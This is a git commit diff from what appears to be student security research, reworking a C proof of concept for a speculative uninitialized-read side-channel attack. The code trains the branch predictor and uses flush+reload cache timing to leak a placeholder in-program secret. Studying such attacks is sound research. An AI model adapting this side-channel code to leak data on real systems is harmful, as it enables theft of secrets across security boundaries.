86dd9f05644064cc99500ebde30f1c02f11bf31d
Chris Wagenaar <c.c.j.wagenaar@student.vu.nl>
2023-06-20 16:25:22 +0200

    uninit_read first cleanup

--- unititialized_read/uninit_read.c
+++ unititialized_read/uninit_read.c
@@ -1,115 +1,88 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <time.h>
+
 #include "../lib/gen_array.c"
 #include "../lib/time_and_flush.c"
 #include "../lib/print_results.c"
 
 #define N_PAGES 256
-#define REPETITIONS 10
+#define REPETITIONS 5
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-#define SECRET_SIZE 8
-#define N_TRAINING 100
+#define SECRET_SIZE 9
+#define N_TRAINING 10
 #define SECRET "mysecret"
 #define false 0
 #define true  1
+#define DBG 0
+#define MALLOC_SIZE 4096
 
-#define DBG false
+#define ALIGNED_SIZE 4096
 
-
-//int* i_global;
-//int* j_global;
-//int* k_global;
 cp_t* flush_reload_arr;
+volatile cp_t cp;   //cache page declared out of function to keep stack identical to init_func()
+int __attribute__((aligned(ALIGNED_SIZE))) init_cp;
 
-void victim_subfunc(int i) {
-    //char secret_char = SECRET[i_global];
-    //volatile cp_t cp = flush_reload_arr[secret_char];
-    volatile cp_t cp = flush_reload_arr[SECRET[i]];
-    //if(DBG) printf("\tstoring %c in fr_arr\n", secret_char);
+__attribute__((noinline)) void init_func(int val) {
+    //cp = flush_reload_arr[91];
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x = val;
+    printf("init  \t%p:\t%d\n", &x, x);
 }
 
-void attacker_func(int* i_addr, int secret_index) {
-    *i_addr = secret_index;
-    //if(DBG) printf("\ti_gbl = %d\n", secret_index);
+__attribute__((noinline)) void uninit_func() {
+    //cp = flush_reload_arr[01];
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x;
+    cp = flush_reload_arr[x];
+    printf("uninit\t%p:\t%d\n", &x, x);
 }
 
-/*
- * Variables required in cache:
- *  i_global
- *  SECRET
- *
- * Variables requried in mem:
- *  initialized
- */
-void victim_main_func(int initialize_index, int secret_index) {
-    int i,j,k;
-    int* i_j_k_addresses[3];
-    i_j_k_addresses[0] = &i;
-    i_j_k_addresses[1] = &j;
-    i_j_k_addresses[2] = &k;
+//static inline void victim_func(char init) {
+__attribute__((noinline)) void victim_func(char init) {
+    int val = 5;
+    init_cp = init;
 
-    char initialized[3] __attribute__ ((aligned (256)));
-    for(int iter = 0; iter < 3; iter++) initialized[iter] = false;  //all false
-
-    //BRO THIS IS A BRANCH, INFLUENCING THE BRANCH PREDICTOR
-    *i_j_k_addresses[initialize_index] = initialize_index;
-    initialized[initialize_index] = true;
-
-    attacker_func(&i, secret_index);
-
-    //put the required variables in cache
-    volatile char* scrt = SECRET;
-    volatile int i_copy = i;
-    //if(initialize_index==2) printf("\ti = %d\n", i);
-
-    cpuid();
-    flush((void*)&initialized[0]);
+    //flush((void*)&val);
+    flush((void*)&init_cp);
     cpuid();
 
-    //volatile cp_t cp0 = flush_reload_arr[initialized[0]];
-    if(initialized[0]) {
-        //volatile cp_t cp0 = flush_reload_arr[0];
-        //if(DBG) printf("\tinit[0] is true. \n");
-
-        victim_subfunc(i);
-        //volatile cp_t cp = flush_reload_arr[SECRET[i]];
+    if(init_cp) {
+        init_func(val);
+    }
+    else {
+        uninit_func();
     }
 
 }
-//printf("load initialized[0] = %d\n", time_mem_load((void*)&initialized[0]));
+
+void touch_secret(int secret_index) {
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) s = SECRET[secret_index];
+    printf("secret\t%p:\t%d\n", &s, s);
+}
 
 int* prepare(int secret_index) {
 
     flush_reload_arr = init_flush_reload(N_PAGES);
     flush_arr((void*)flush_reload_arr, N_PAGES);
-
-    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
-    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
-    char init_indices[n_accesses];
-    char secret_indices[n_accesses];
-    for(int i = 0; i < n_accesses; i++) {
-        init_indices[i] = 0;
-        secret_indices[i] = 0;
-    }
-    init_indices[n_accesses-1] = 2;
-    secret_indices[n_accesses-1] = secret_index;
     cpuid();
 
+    int n_accesses = N_TRAINING + 1;
+    char init_bools[n_accesses];
+    for(int i = 0; i < n_accesses; i++) init_bools[i] = false;
+    init_bools[n_accesses-1] = true;
+
     for(int i = 0; i < n_accesses; i++) {
-        //if(DBG) printf("\n%d:\tinit %d\tsecret %d\n", i, init_indices[i], secret_indices[i]);
-        victim_main_func(init_indices[i], secret_indices[i]);
+        touch_secret(secret_index);
+        victim_func(init_bools[i]);
         cpuid();
-        if(init_indices[i] != 2) {
+        if(i < n_accesses-1) {
             cpuid();
-            flush_arr(flush_reload_arr, N_PAGES);
+            flush_arr((void*)flush_reload_arr, N_PAGES);
         }
         cpuid();
+
     }
 
     cpuid();
-
     //time loading duration per array index
     int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
     unmap_cache_pages(flush_reload_arr, N_PAGES);
@@ -117,10 +90,9 @@ int* prepare(int secret_index) {
 }
 
 int main(int argc, char** argv) {
-    srand(time(0));
+
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
 
-    //results[0][0] = prepare(1);
     for(int r = 0; r < REPETITIONS; r++) {
         printf("\nREPETITION %d\n", r);
         for (int s = 0; s < SECRET_SIZE; s++) {
@@ -132,5 +104,6 @@ int main(int argc, char** argv) {
     print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);
 
     free_results(results, REPETITIONS, SECRET_SIZE);
+
 
 }
